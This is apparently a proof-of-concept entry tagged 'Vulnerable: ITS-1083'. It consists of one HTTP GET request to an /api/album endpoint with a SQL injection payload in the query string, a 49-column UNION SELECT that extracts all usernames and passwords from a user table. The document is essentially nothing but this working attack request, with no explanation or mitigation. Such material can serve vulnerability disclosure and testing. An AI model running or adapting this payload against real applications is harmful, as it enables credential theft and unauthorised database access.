# Vulnerable: ITS-1083
GET /api/album?_end=36&_order=DESC&_sort=recently_added&_start=0&1+like+1)+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,(select+group_concat(concat(user_name,':',password))from+user),15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49--=123
